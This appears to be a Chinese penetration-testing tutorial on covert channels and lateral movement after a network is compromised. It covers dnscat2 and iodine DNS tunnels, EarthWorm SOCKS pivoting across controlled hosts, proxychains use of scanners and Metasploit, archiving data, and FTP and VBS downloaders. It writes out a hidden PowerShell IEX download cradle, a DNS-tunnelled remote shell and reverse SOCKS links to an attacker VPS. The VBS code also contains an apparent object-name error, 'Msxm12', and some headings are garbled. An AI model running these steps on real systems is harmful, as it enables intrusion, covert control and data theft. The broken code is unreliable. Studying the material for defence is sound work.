       b）如果解析失败，就向根服务器提出请求。根服务器发现该域名时.com域名，就会将请求交给.com域名服务器进行解析。.com域名服务器发现域名是.ms08067.com，就会将域名转交给.ms08067.com域名服务器，看看有没有这条记录。.ms08067.com域名服务器收到地址a.ms08067.com后，会查找它的A记录：如果有，就返回a.ms08067.com这个地址；如果没有，就在.ms08067.com域名服务器上设置一个NS类型的记录，类似"ms08067.com NS 111.222.333.444"\(因为**这里一般不允许设置为地址，所以需要在DNS服务器上先添加一条A记录**，例如"ns.ms08067.com 111.222.333.444",**再添加一条NS记录**"[ms08067.com](http://ms08067.com/) NS ns.ms08067.com",并将IP地址111.222.333.444修改为指定的公网VPS的IP地址）。

安装后，需要测试一下域名解析是否设置成功。输入"ping ns1.yokan.\*\*\*"，如下图，如果该命令能够执行，且显示的IP地址为1\*\*.\*\*\*.\*\*\*.\*\*\*（VPS地址），说明第一条A类解析设置成功并已生效。

![3824a70fabba2b290dda89a16a7a29b0.png](image/3824a70fabba2b290dda89a16a7a29b0.png)

接下来，在VPS服务器上进行抓包\(端口53的UDP包），命令如下：

```
tcpdump -n -i eth0 udp dst port 53
```

输入如下命令

```
nslookup ***.yokan.***
```

![a1cdee855d590ef2acdd5651ea2872f4.png](image/a1cdee855d590ef2acdd5651ea2872f4.png)

此时，查看VPS服务器上的抓包情况。如果抓到对域名c\*\*.yokan.\*\*\*进行查询的DNS请求数据包，就说明第二条NS解析设置已经生效

![f0236181b5fe7c0c6151c8c1d1eb5ee0.png](image/f0236181b5fe7c0c6151c8c1d1eb5ee0.png)

      2、安装dnscat2服务端

在VPS服务器上安装dnscat2服务端。因为服务端是用Ruby语言编写的，所以需要配置Ruby环境。Kali Linux内置了Ruby环境，但在运行时可能缺少一些gem依赖包。使用Ubuntu服务器，运行如下命令进行安装

```
apt-get install gem
apt-get install ruby-dev
apt-get install libpq-dev
apt-get install ruby-bundler
```

```
apt-get install git
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install
```

![66cc08b872221d42982c7f82d3749c7b.png](image/66cc08b872221d42982c7f82d3749c7b.png)

![2b72d15961692b77404e8b3f34040f34.png](image/2b72d15961692b77404e8b3f34040f34.png)

接下来，执行如下命令，启动服务端

```
sudo ruby ./dnscat2.rb c**.yokan.*** -e open -c just_test --no-cache
```

如果采用的是直连模式，可以输入如下命令

```
sudo ruby ./dnscat2.rb --dns server=127.0.0.1,port=533,type=TXT --secret=just_test
```

以上命令表示监听本机的533端口，自定义连接密码为"just\_test"

\-c :  定义了“pre\-shared secret”，可以使用具有预共享密钥的身份验证机制来防止中间人攻击。否则，因为传输的数据并未加密，所以可能被监听网络流量的第三方还原。如果不定义此参数，dnscat2会生成一个随机字符串（将其复制下来，在启动客户端时需要使用它）

\-e :  规定安全级别。“open”表示服务端允许客户端不进行加密

\-\-no\-cache :  禁止缓存。务必在运行服务器时添加该选项，因为powershell\-dnscat2客户端与dnscat2服务器的Caching模式不兼容。

![0646fadd7a13666a8bc22ca223460ac5.png](image/0646fadd7a13666a8bc22ca223460ac5.png)

      3、在目标主机上安装客户端

dnscat2客户端是使用C语言编写的，因此在使用前需要进行编译。在Windows中，可以使用VS进行编译；在Linux中，直接运行“make install”命令即可进行编译

在Linux中输入如下命令，在目标机器上安装dnscat2客户端

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make
```

在本次测试中，目标机器的操作系统是Windows，因为可以直接使用编译好的Windows客户端[https://downloads.skullsecurity.org/dnscat2/](https://downloads.skullsecurity.org/dnscat2/)

服务端建立后，执行如下命令，测试客户端是否能与服务端通信

```
dnscat2-v0.07-client-win32.exe --ping c**.yokan.***
```

执行如下命令，连接服务端

```
dnscat2-v0.07-client.win32.exe --dns domain=c**.yokan.*** --secret just_test
```

如果客户端连接成功，会显示"Session established"，这条信息。

如果服务端使用的是直连模式，可以直接填写服务端的IP地址（不通过DNS服务提供商），向dnscat2服务端所在的IP地址请求DNS解析，命令如下：

```
dnscat --dns server=<dnscat2 server ip>,port=533,type=TXT --secret=just_test
```

**推荐使用powershell版本的dnscat2客户端**dnscat2\-powershell\([https://github.com/lukebaggett/dnscat2\-powershell](https://github.com/lukebaggett/dnscat2-powershell)\)。如果要使用dnscat2\-Powershell脚本，目标Windows机器需要支持powershell2.0以上版本。

把脚本下载到目标机器中，执行如下命令：

```
Import-Module .\dnscat2.ps1
```

当然，也可以执行如下命令来加载脚本，下载地址见（[https://raw.githubusercontent.com/lukebaggett/dnscat2\-powershell/master/dnscat2.ps1](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1)）

```
IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
```

加载脚本后，执行如下命令，开启dnscat2\-powershell服务：

```
Start-Dnscat2 -Domain ***.yokan.*** -DNSServer 106.***.***.***
```

![aafc53d19f0cd9eb399d7f73efd20dd8.png](image/aafc53d19f0cd9eb399d7f73efd20dd8.png)

输入如下命令，使用IEX加载脚本的方式，在内存中打开dnscat2客户端

```
powershell.exe -nop -w hidden -c {IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');Start-Dnscat2 -Domain c**.yokan.*** -DNSServer 106.***.***.***}
```

在客户端中运行dnscat2.ps1脚本之后，在服务器中可以看到客户端上线的提示

![6fa894acfece2841eed5dc9e622ecccd.png](image/6fa894acfece2841eed5dc9e622ecccd.png)

      4、反弹shell

dnscat2服务端使用的是交互模式，所有的流量都由DNS来处理。dnscat2的使用方法和Metasploit类似。

客户端和服务端建立连接后，服务端处理交互模式，输入“Windows”或者“sessions"命令，可以查看当前的控制进程（每个连接都是独立的）

输入”window \-i 1"或者“session \-i 1"命令，进入目标主机，输入“help”命令，可以查看控制台支持的命令。

输入"shell”命令，打开另外一个会话，建立一个交互环境。可以输入cmd命令，进行查询

![febb7a6f431dd884efffc1ad86a8ee1b.png](image/febb7a6f431dd884efffc1ad86a8ee1b.png)

![3b24b260c5928bced3a26f5c049f314e.png](image/3b24b260c5928bced3a26f5c049f314e.png)

调用exec命令，可以远程打开程序。例如

```
exec notepad.exe
```

执行如下命令，创建一个控制台，然后可以执行powershell命令和脚本

```
exec psh
```

![9ba18f7130a81a582f62bab65675f4e8.png](image/9ba18f7130a81a582f62bab65675f4e8.png)

dnscat2还提供了多域名并发的特性，可以将多个子域名绑定在同一个NS下，然后在服务端同时接收多个客户端连接，具体命令如下：

```
ruby dnscat2.rb --dns=port=53532 --security=open
start --dns domain=<domain.com>,domain=<doman.com>
```

- **iodine**

碘的原子序数为53，而这恰好是DNS的端口号，故该工具被命名为"iodine"

iodine可以通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。iodine是基于C语言开发的，分为服务端程序iodined和客户端程序iodine。kali中内置了iodine。 下载：[https://github.com/Al1ex/iodine](https://github.com/Al1ex/iodine)

（iodine相对于dnscat2来说，速度和稳定性都是在dnscat2之上的，因此建立DNS隧道，iodine这款工具是首选）

与同类工具相比，iodine有如下优点：

i）不会对下行数据进行编码

ii）支持多平台，Linux、Windows、BSD、Mac OS

iii）支持16个并发连接

iv）支持强密码机制

v）支持同网段隧道IP地址

vi）支持多种DNS记录类型

vii）提供了丰富的隧道质量检测措施

iodine支持直接转发和中继两种模式，其原理是:通过 TAP虚拟网卡,在服务端建立一个局域网;在客户端，通过TAP 建立一个虚拟网卡;两者通过 DNS 隧道连接，处于同—个局域网\(可以通过ping命令通信）。在客户端和服务端之间建立连接后，客户机上会多出一块名为“dns0”的虚拟网卡。更多使用方法和功能特性，请参考iodine的官方文档：[http://code.kryo.se/iodine](http://code.kryo.se/iodine)

      1、安装服务端

首先，设置域名。在这里要尽可能使用短域名（域名越短，隧道的带宽消耗就越小）。设置A记录iodine服务器的IP地址，将NS记录指向此域名

![5a26bd3e4775197d5d62dd5cec46b5bd.png](image/5a26bd3e4775197d5d62dd5cec46b5bd.png)

接下来，在服务端中安装iodine。在Windows中，需要安装编译好的对应版本的iodine。在Kali Linux中，默认安装了iodine。如果使用的是基于Debian的发行版Linux，可以执行如下命令进行安装：

```
apt install iodine
```

![f17191d3cce8bc2501c234c2515ff383.png](image/f17191d3cce8bc2501c234c2515ff383.png)

安装后，就可以使用如下命令运行iodine了

```
iodined -f -c -P just_test 192.168.0.1 ***.yokan.*** -DD
```

![01637447c2555e2945abdbb9c0534e4b.png](image/01637447c2555e2945abdbb9c0534e4b.png)

\-f :  在前台运行

\-c :  禁止检查所有传入请求的客户端IP地址

\-P :  客户端和服务器之间用于验证身份的密码

\-D :  指定调试级别。 \-DD指第二级。“D”的数量随等级增加

这里的192.168.0.1是自定义的局域网虚拟IP地址。完成基本配置后，可以通过iodine检查页面（[https://code.kryo.se/iodine/check\-it](https://code.kryo.se/iodine/check-it)）检查配置是否正确

![48e31eb357a2f93da4f482f2c767b6f7.png](image/48e31eb357a2f93da4f482f2c767b6f7.png)

如果配置无误却无法正常工作，需要检查服务端的防火墙配置情况。

      2、安装客户端，并使用DNS隧道

2\-1）在Linux客户端机器上，只需要安装iodine客户端，命令如下：

```
apt install iodine
iodine -f -P just_test ***.yokan.*** -M 200
```

\-r :  iodine有时可能会自动将DNS隧道切换为UDP通道，该参数的作用是强制在任何情况下使用DNS隧道

\-M :  指定上行主机名的大小

\-m :  调节最大下行分片的大小

\-T :  指定所使用的DNS请求的类型，可选项有NULL、PRIVATE、TXT、SRV、CNAME、MX、A

\-O :  指定数据编码规范

\-L :  指定是否开启懒惰模式（默认为开启）

\-I :  指定请求与请求之间的时间间隔

出现这个表明建立连接成功

![3f965ca2148c5f8536bbe00b0adc4169.png](image/3f965ca2148c5f8536bbe00b0adc4169.png)

可以看到，客户端上多了一块dns0虚拟网卡

![deba7f4a79b2beaebc8b5029fb3dc997.png](image/deba7f4a79b2beaebc8b5029fb3dc997.png)

并且可以看到路由规则上增添了192.168.0.0这个网段

![74a681dfeafe33f733f9de79828aa60f.png](image/74a681dfeafe33f733f9de79828aa60f.png)

在VPS服务端上已经建立了连接

![31cd849f57bfa0f7541b4dc06ee17244.png](image/31cd849f57bfa0f7541b4dc06ee17244.png)

使用DNS隧道：新启一个终端，我们尝试在VPS上远程连接目标机器，显示连接成功

![6f1a94cb692a4e91abcba1ba8d7aac06.png](image/6f1a94cb692a4e91abcba1ba8d7aac06.png)

2\-2）如果目标机器是Windows机器，因此需要下载编译好的Windows版本，同时，需要安装TAP网卡驱动程序。也可以下载OpenVPN,在安装时仅选择TAP\-Win32驱动程序（ 下载地址：[https://swupdate.openvpn.org/community/releases/tap\-windows\-9.9.2\_3.exe](https://swupdate.openvpn.org/community/releases/tap-windows-9.9.2_3.exe)）。安装后，服务器上多了一块名为"TAP\-Windows Adapter V9"的网卡

![efcab10864da4b75a44e64f23ae909da.png](image/efcab10864da4b75a44e64f23ae909da.png)

然后我们接着下载iodine的windows客户端[http://code.kryo.se/iodine/iodine\-0.7.0\-windows.zip](http://code.kryo.se/iodine/iodine-0.7.0-windows.zip)

将iodine\-0.7.0\-Windows解压后，进入解压目录，输入如下命令，连接服务端

（ 要以管理员的身份运行命令，我认为iodine唯一的缺点就是要高权限运行命令，可能要配合提权操作才能充分发挥iodine的作用）

```
iodine.exe -f -P just_test ***.yokan.***
```

![a612d7b398476c524330730fe4f1920c.png](image/a612d7b398476c524330730fe4f1920c.png)

如果出现，如上图，“Connection setup complete, transmitting data.”的提示信息，就表示DNS隧道已经建立了。

此时，TCP over DNS已经建立了。在客户端执行"ping 192.168.0.1"命令，连接成功

![5e91d87dca845b86cdb0da145b971727.png](image/5e91d87dca845b86cdb0da145b971727.png)

使用DNS隧道：DNS隧道的使用方法比较简单。由于客户端和服务器在同一个局域网中，只要直接访问即可。例如，登录目标主机的3389端口，就可以直接执行"rdesktop 192.168.0.2:3389"命令。同样，目标主机也可以通过SSH进行登录服务器

![a261922a01ccd782d2671feebf65f573.png](image/a261922a01ccd782d2671feebf65f573.png)

![402fa806fd03c451ee00a7975f0b53be.png](image/402fa806fd03c451ee00a7975f0b53be.png)

- **防御DNS隧道的方法**

防御隧道攻击并非易事，特别是防御DNS隧道攻击。通过如下操作，能够防御常见的隧道攻击行为。

i）禁止网络中的任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信

ii）虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器/网关会这样做。因此，可以将邮件服务器/网关列入白名单并阻传人和传出流量中的TXT请求。

iii）跟踪用户的 DNS查询次数。如果达到阅值，就生成相应的报告

iv）阻止ICMP

**SOCKS代理**

常见的网络场景有如下三类：

i：  服务器在内网中 ，可以任意访问外部网络。

ii： 服务器在内网中 ，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接

iii：服务器在内网中，对外只开放了部分端口（如80），且服务器不能访问外部网络

**常用SOCKS代理工具**

SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。SOCKS分为SOCKS4和SOCKS5：SOCKS4只支持TCP协议；SOCKS5不仅支持TCP/UDP协议，还支持各种身份验证机制等，其标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发。

SOCKS代理可以理解为增强版的lcx 。

常见工具：

- EarthWorm

       EW是一套便携式的网络工具，具有SOCKS5服务架设和端口转发两个核心功能，可以在复杂的网络环境中实现网络穿透，[https://github.com/rootkiter/EarthWorm](https://github.com/rootkiter/EarthWorm)   

        [https://codeload.github.com/idlefire/ew/zip/master](https://codeload.github.com/idlefire/ew/zip/master)

       EW能够正向、反向、多级级联等方式建立网络隧道。EW工具包提供了多个可执行文件，以适用不同的操作系统 （Linux、Windows、Mac OS、ARM\-Linux均包含在内）。

       EW的新版本Termite,[https://github.com/rootkiter/Termite](https://github.com/rootkiter/Termite)   

- reGeorg

       reGeorg的主要功能是把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本地。

       reGeorg可以使目标服务器在内网中连接内部开放端口。reGeorg利用webshell建立一个SOCKS代理进行内网穿透

- sSocks

       sSocks支持SOCK5验证，支持IPv6和UDP，并提供反向SOCKS代理服务（将远程计算机作为SOCKS代理服务端反弹到本地）

- SocksCap64

       SocksCap64是一款在Windows环境中相当好用的全局代理软件，[http://www.sockscap64.com/](http://www.sockscap64.com/)

       SocksCap64可以**使Windows应用程序通过SOCKS代理服务器来访问网络**，而不需要对这些应用程序进行任何修改。**即使是那些本身不支持SOCKS代理的应用程序**，也可以通过SocksCap64实现代理访问

- Proxifier

       Proxifier也是一款非常好用的全局代理软件，[https://www.proxifier.com/](https://www.proxifier.com/)

       Proxifier提供了跨平台的端口转发和代理功能，适用于Windows、Linux、macos平台

- ProxyChains

       ProxyChains是一款可以在Linux下实现全局代理的软件，性能稳定、可靠，**可以使任何程序通过代理上网**，允许TCP和DNS流量通过代理隧道，支持HTTP、SOCKS 4、SOCKS 5类型的代理服务器   

       [http://proxychains.sourceforge.net/](http://proxychains.sourceforge.net/)

**SOCKS代理技术在网络环境中的应用**

- EarchWorm的应用

        EW有六种命令格式，分别是ssocksd、rcsocks、rssocks、lcx\_slave、lcx\_listen、lcx\_tran。ssocksd命令用于普通网络环境的正向连接，rcsocks和rssocks用于反弹连接，其他命令用于复杂网络环境的多级级联。

        操作手册：

![a2d6d8d03caf93992fa40bdf852b95f5.png](image/a2d6d8d03caf93992fa40bdf852b95f5.png)

        测试环境：左侧有一个人计算机，为攻击者的计算机，位于攻击者的内网中，攻击者还有一台公网中的vps；右侧是一个受害内网，有三台机器，我们已经控制的web服务器有两个网卡，是连接外网和内网的关键节点，内网其他机器之间均不能直接连接。

![a48fb2cfb6bf5ce1661a4a72b6a43604.png](image/a48fb2cfb6bf5ce1661a4a72b6a43604.png)

①正向SOCKS 5服务器

以下命令**适用于目标机器拥有一个外网IP地址**的情况， 如上图内网web服务器的模拟外网IP为192.168.1.7。在web服务器上面上传对应的ew程序并执行：

```
ew -s ssocksd -l 888
```

![c60314bba8ea3c00f52738930494b2e6.png](image/c60314bba8ea3c00f52738930494b2e6.png)

这样，就在内网web服务器上面架设了一个端口为888的socks代理服务。接下来我们就可以设置proxychains或SocksCap64添加这个socks代理服务器（192.168.1.7）的代理即可。配置proxychains：

![090a3c6dcec163a9ed07c63ce7f58850.png](image/090a3c6dcec163a9ed07c63ce7f58850.png)

打开内网Windows server 8的远程桌面：

```
proxychains4 rdesktop 192.168.52.138
```

②反弹SOCKS 5 服务器

**适用于目标机器没有公网IP地址的情况**具体如下：

![20a73bafecf3ef512611881b183aa0a0.png](image/20a73bafecf3ef512611881b183aa0a0.png)

在攻击者公网vps上面上传ew\_for\_linux64并执行：

```
./ew_for_linux64 -s rcsocks -l 1080 -e 1234
```

该命令的意思是，在公网VPS上添加一个**转接隧道**，把1080端口收到的代理请求转发给1234端口

![ff6df0d0d310a62d42389ca7185cf599.png](image/ff6df0d0d310a62d42389ca7185cf599.png)

接着，在内网web服务器（192.168.52.143）上传ew\_for\_Win.exe，并执行命令：

```
ew_for_Win.exe -s rssocks -d 39.xxx.xxx.210 -e 1234
```

该命令的意思是，在IP地址为192.168.52.143的服务器上启动SOCKS5 服务，然后反弹到公网IP地址为39.XXX.XXX.210的1234端口上

![6b1c49f5b555444aaccc4bd403046cd0.png](image/6b1c49f5b555444aaccc4bd403046cd0.png)

最后返回公网VPS的命令行界面。可以看到反弹成功了：

![146004f3a804bcce4b49f1ee8ceee3b1.png](image/146004f3a804bcce4b49f1ee8ceee3b1.png)

现在就可以在攻击者计算机上面配置proxychains或SocksCap64等工具**通过访问公网vps（39.xxx.xxx.210）的1080端口来使用内网web服务器上面架设的socks代理服务**了。

③二级网络环境\(a\)

适用于目标机器拥有一个外网IP地址的情况下。具体如下：

![531f0ee316c8e6325aad16bb22b65866.png](image/531f0ee316c8e6325aad16bb22b65866.png)

右侧内网A主机有两个网卡，一个连接外网（192.168.1.7），另一个只能连接内网的B主机，但不能访问内网中的其他主机资源。B主机可以访问内网其他资源，但不能访问外网。假设我们已经获得了A主机和B主机的控制权。

我们先将ew上传至B主机上面，并用ssocksd方式启动1234端口的正向socks代理：

```
ew_for_Win.exe -s ssocksd -l 1234
```

![18f31dc910392e9583064dd807bb63f2.png](image/18f31dc910392e9583064dd807bb63f2.png)

接着，将ew上传至A主机中，并执行命令：

```
ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.52.138 -g 1234
```

![97f0a8592593eb129a57e4bebd75c950.png](image/97f0a8592593eb129a57e4bebd75c950.png)

该命令的意思是**将A主机1080端口收到的代理请求转发给B主机（192.168.52.138）的1234端口**。

现在，我们就可以通过**访问A主机的公网IP（192.168.1.7）的1080端口来**使用架设在B主机上的socks代理服务了。

④二级网络环境\(b\)

刚才那个适用于目标机器拥有一个外网IP地址的情况下，假设目标机器没有公网IP的情况下，我们该怎么办呢？

![0b2550277159b1d1706061212162b43e.png](image/0b2550277159b1d1706061212162b43e.png)

如上图环境，A主机既没有公网IP，**可以能访问外网**，不能访问内网其他主机资源，但可以访问内网B主机；内网B主机可以访问内网资源，但不能访问外网。假设我们已经获得了A主机和B主机的控制权限。

这里，我们不能像前一种情况那样通访问A主机来使用内网B主机上面架设的socks代理服务，可以**通过访问vps来访问B主机上面架设的socks服务**。

我们先在公网vps上传ew，在公网vps上面添加转接隧道，监听1080端口，并将1080端口收到的代理请求发送给1234端口，执行命令：

```
ew_for_linux64 -s lcx_listen -l 1080 -e 1234
```

![ba41d2f0eae8b047f81e4329e1bf6df7.png](image/ba41d2f0eae8b047f81e4329e1bf6df7.png)

然后将ew上传至内网B（192.168.52.138）主机，并利用**ssocksd**方式启动999端口的正向socks代理，执行命令：

```
ew_for_Win.exe -s ssocksd -l 999
```

![2f5e9ab66dcc52e3a625e32f71996315.png](image/2f5e9ab66dcc52e3a625e32f71996315.png)

最后，将ew上传到内网A主机上，在A主机（192.168.52.143）上利用**lcx\_slave**方式，**将公网vps的1234端口与内网B主机（192.168.52.138）的999端口连接起来**，执行命令：

```
ew_for_Win.exe -s lcx_slave -d 39.xxx.xxx.210 -e 1234 -f 192.168.52.138 -g 999
```

![7dc3a3a232e746b9ee7c6a75f615b869.png](image/7dc3a3a232e746b9ee7c6a75f615b869.png)

此时，就可以设置proxychains等代理工具，通过访问公网vps的1080端口来使用架设在内网B主机上的socks代理服务了。

⑤**三级网络环境**

三级网络环境在渗透测试中比较少见，也比较复杂。下面详细讲解三级级联命令的用法：

测试环境为：右侧的内网A主机没有公网IP地址，但可以访问外网；B主机不能访问外网，但可以被A主机访问；C主机可被B主机访问，而且能够访问核心区域。

![77c30a2ee6140dc49943631f900e7154.png](image/77c30a2ee6140dc49943631f900e7154.png)

在公网VPS上执行如下命令，将1080端口收到的代理请求转发给888端口

```
ew -s rcsocks -l 1080 -e 888
```

在A主机上执行如下命令，将公网VPS的888端口和B主机的999端口连接起来

```
ew -s lcx_slave -d 139.xxx.xxx.113 -e 888 -f 10.48.128.12 -g 999
```

在B主机上执行如下命令，将999端口收到的代理请求转发给777端口

```
ew -s lcx_listen -l 999 -e 777
```

在C主机上启动SOCKS5服务，并反弹到B主机的777端口上

```
ew -s rssocks -d 10.48.128.12 -e 777
```

现在就可以通过访问公网VPS\(139.XXX.XXX.113\)的1080端口使用在C主机上架设的SOCKS 5代理了。

- 在Windows下使用SocksCap64实现内网漫游

下载安装[https://www.sockscap64.com/](https://www.sockscap64.com/) ，以管理员权限打开程序\(默认已经添加了浏览器\)

![37c21f05148079f7518b035db2874c73.png](image/37c21f05148079f7518b035db2874c73.png)

SocksCap64的使用方法比较简单，单机"代理"按钮，添加一个代理，然后设置代理服务器的IP地址和端口即可。设置完成后，可以单机界面上的闪电图标按钮，测试当前代理服务器是否可以连接

![3a31083557204b1a4556cdae96b2dede.png](image/3a31083557204b1a4556cdae96b2dede.png)

选择浏览器，单机右键，在弹出的快捷菜单中单机"在代理隧道中运行选中程序"选项，就可以自由访问内网资源了。例如，访问192.168.111.156的80端口

![4508b06714970e6e4fb7f8536e206228.png](image/4508b06714970e6e4fb7f8536e206228.png)

![c40e597e21c0b4872e46df5df9040922.png](image/c40e597e21c0b4872e46df5df9040922.png)

尝试登录192.168.111.175的3389端口：

右键 添加一个EXE文件，找到mstsc.exe添加

![0502c9f6335824dccdab978febca16ae.png](image/0502c9f6335824dccdab978febca16ae.png)

单机右键，在弹出的快捷菜单中单机"在代理隧道中运行选中程序"选项

![2e50e119c8f7598f80648eb2bd7c2e97.png](image/2e50e119c8f7598f80648eb2bd7c2e97.png)

![2b001243c5427b81dfa43fb301abe322.png](image/2b001243c5427b81dfa43fb301abe322.png)

- 在Linux下使用proxychains实现内网漫游

Kali linux中预装了proxychains，稍加配置就可以使用。打开终端，输入如下命令

```
vi /etc/proxychains.conf
```

在底部输入SOCKS代理信息，保存

![d8caf4140d18e7e3808d62c6c495a4cd.png](image/d8caf4140d18e7e3808d62c6c495a4cd.png)

测试以下代理服务器是否能正常工作

```
proxyresolv www.baidu.com
```

![474520fe0cade0cd15a1a7924275fe20.png](image/474520fe0cade0cd15a1a7924275fe20.png)

此时会显示“命令未找到”。在终端输入：

```
cp /usr/lib/proxychains3/proxyresolv /usr/bin
```

再次测试，显示‘OK',表示代理服务器已经正常工作了。

![66ca7482f7c00b18d3eff84877a43c27.png](image/66ca7482f7c00b18d3eff84877a43c27.png)

现在就可以访问内网了。

先访问内网中的网站。在终端输入' proxychains firefox'，启动火狐浏览器。 待浏览器打开即可访问内网中的网站：

![3aa3da3ca655903c5fea3f9419ba705d.png](image/3aa3da3ca655903c5fea3f9419ba705d.png)

在每个工具前面加上 'proxychains' ，命令即可在内网中使用，例如一些扫描器

```
proxychains nmap 192.169.111.175
proxychains sqlmap -u 192.168.111.157
```

**通过proxychains，Metasploit也可在内网中使用**

```
输入如下命令，启动metasploit
proxychains msfconsole
即可正常在内网中使用
```

**压缩数据**

在渗透测试中，下载数据是一项重要的工作。下面就具体讲讲压缩软件在渗透测试中的使用方法。

**RAR**

WinRAR提供了强力压缩、分卷、加密和自解压模块，简单易用。

如果目标机器安装了WinRAR，可以直接使用；如果没有安装，可以在本地下载并安装，然后把WinRAR安装目录里的rar.exe文件提取出来，上传到目标机器中\(安装WinRAR的操作系统版本和目标机器的操作系统版本必须相同，否则可能会出错

```
-a： 添加要压缩的文件
-k： 锁定压缩文件
-s： 生成存档文件（这样可以提供压缩比）
-p： 指定压缩密码
-r： 递归压缩，包括子目录
-x： 指定要排除的文件
-v： 分卷打包，在打包大文件时用处很大
-ep：从名称中排除路径
-ep1：从名称中排除基本目录
-m0：存储，添加到压缩文件时不压缩文件
-m1：最快，使用最快压缩方式（低压缩比）
-m2：较快，使用快速压缩方式
-m3：标准，使用标准压缩方式（默认）
-m4：较好，使用较强压缩方式（速度较慢）
-m5：最好，使用最强压缩方式（最好的压缩方式，但速度最慢）
```

- 以RAR格式压缩/解压

把C:\\Users\\86153\\Desktop\\testrar\\ 目录下的所有内容\(包括子目录\)打包为1.rar，放到C:\\Users\\86153\\Desktop\\testrar\\ 目录下，命令如下：

```
Rar.exe a -k -r -s -m3 C:\Users\86153\Desktop\testrar\1.rar C:\Users\86153\Desktop\testrar
```

![6f4d4b57d87871d22960500dbf3ee089.png](image/6f4d4b57d87871d22960500dbf3ee089.png)

接下来讲解一下如何解压文件:

把刚刚打包的C:\\Users\\86153\\Desktop\\testrar\\1.rar 文件解压到当前根目录下，命令如下

```
Rar.exe e C:\Users\86153\Desktop\testrar\1.rar
```

![a89926831dcc82d76e94fd845de3668f.png](image/a89926831dcc82d76e94fd845de3668f.png)

e：解压到当前根目录下

x：以绝对路径解压

以ZIP格式压缩/解压的命令和RAR一样，只需把后缀改称'.zip'

- 分卷压缩/解压

分卷压缩E盘API目录下的所有文件及文件夹（使用\-r参数进行递归压缩），设置每个分卷为20MB，结构为test.part1.rar、test.part2.rar、test.part3.rar ...... 命令如下：

```
Rar.exe a -m0 -r -v20m E:\test.rar E:\API
```

解压：将E:\\test.part01.rar解压到E盘的xl目录下：

```
Rar.exe x E:\test.part01.rar E:\x1
```

**7\-Zip**

7\-Zip有更高的压缩比。与WinRAR相比，7\-Zip对系统资源的消耗较少

常见参数：

```
-r 递归压缩
-o  指定输出目录
-p  指定密码
-v  分卷压缩（设置要适当，否则文件会非常多）
a  添加压缩文件
```

如果目标机器装有7\-Zip，可以直接使用；如果没有安装，可以在本地下载并安装，然后把7\-Zip安装目录里的7z.exe文件提取出来，上传到目标机器中.

- 普通压缩/解压方式

把E:\\webs\\ 目录下的所有内容\(包括子目录\)打包为1.7z，放到E:\\webs\\ 目录下，压缩密码为'12345' , 命令如下：

```
7z.exe a -r -p12345 E:\webs\1.7z E:\webs\
```

把已经打包的E:\\webs\\1.7z 文件解压到E:\\x目录下，命令如下：

```
7z.exe x -p12345 E:\webs\1.7z -oE:\x
```

- 分卷压缩/解压方式

分卷压缩E盘API目录下的所有文件及文件夹（使用\-r参数进行递归压缩），指定压缩密码为'admin'，每个分卷20MB，结构为test.7z.001，test.7z.002，test.7z.003 ....... 命令如下：

```
7z.exe -r -v1m -padmin a E:\test.7z E:\API
```

解压文件，执行如下命令，将E:\\test.7z.001解压到E盘的x1目录下：

```
7z.exe x -padmin E:\test.7z.001 -oE:\x1
```

**上传和下载**

对于不能上传shell,但是可以执行命令的Windows服务器（而且唯一的入口就是命令行环境），可以在shell命令行环境中对目标服务器进行上传和下载操作。

**利用FTP协议上�**�

在本地或者VPS上搭建FTP服务器，通过简单的FTP命令即可实现文件的上传。

常用的FTP命令：

```
open <服务器地址> :连接服务器
cd <目录名> ：进入指定目录
lcd <文件夹路径> : 定位本地文件夹
type：查看当前的传输方式
ascii：设定传输方式为ASCII码方式 
binary：设定传输方式为二进制方式
put <文件名> [newname]  上传
send <文件名> [newname]  上传
get/recv：下载单个文件get filename [newname](filename为下载的ftp服务器上的文件名，newname为保存在本都计算机上时使用的名字，如果不指定newname，文件将以原名保存。
get/recv命令下载的文件将保存在本地计算机的工作目录下。该目录是启动ftp客户端时的工作目录目录。如果想修改本地计算机的工作目录，可以使用 lcd 命令。比如：lcd /tmp 表示将工作目录设定/tmp/目录。
mget：下载多个文件mget filename [filename ....]（mget命令支持通配符“*”和“?”，比如：mget  *.jpg 表示下载ftp服务器当前目录下的所有扩展名为jpg的文件。）
prompt：关闭/打开互交提示。
```

**利用VBS上�**�

利用VBS上传，主要使用的是msxm12.xmlhttp和adodb.stream对象。将以下命令保存到download.vbs文件中：

```
Set Post = CreateObject("Msxm12.XMLHTTP")
Set Shell = CreateObject("Wscript.Shell")
Post.Open "GET","http://server_ip/target.exe",0
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode =3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile "C:\test\target.exe",2
```

在目标服务器的shell命令行环境中依次输入上述命令

```
echo Set Post = CreateObject("Msxm12.XMLHTTP") >>download.vbs
echo Set Shell = CreateObject("Wscript.Shell") >>download.vbs
echo Post.Open "GET","http://server_ip/target.exe",0 >>download.vbs
echo Post.Send() >>download.vbs
echo Set aGet = CreateObject("ADODB.Stream") >>download.vbs
echo aGet.Mode =3 >>download.vbs
echo aGet.Type = 1 >>download.vbs
echo aGet.Open() >>download.vbs
echo aGet.Write(Post.responseBody) >>download.vbs
echo aGet.SaveToFile "C:\test\target.exe",2 >>download.vbs
```

依次执行以上命令，会生成download.vbs。

通过执行download.vbs，即可实现下载target.exe文件的操作：

```
Cscript download.vbs
```

**利用Debug上�**�

利用Debug上传文件的原理是，先将需要上传的EXE文件转换为十六进制HEX的形式，再通过echo命令将HEX代码写入文件，最后利用Debug功能将HEX代码编译并还原成EXE文件。

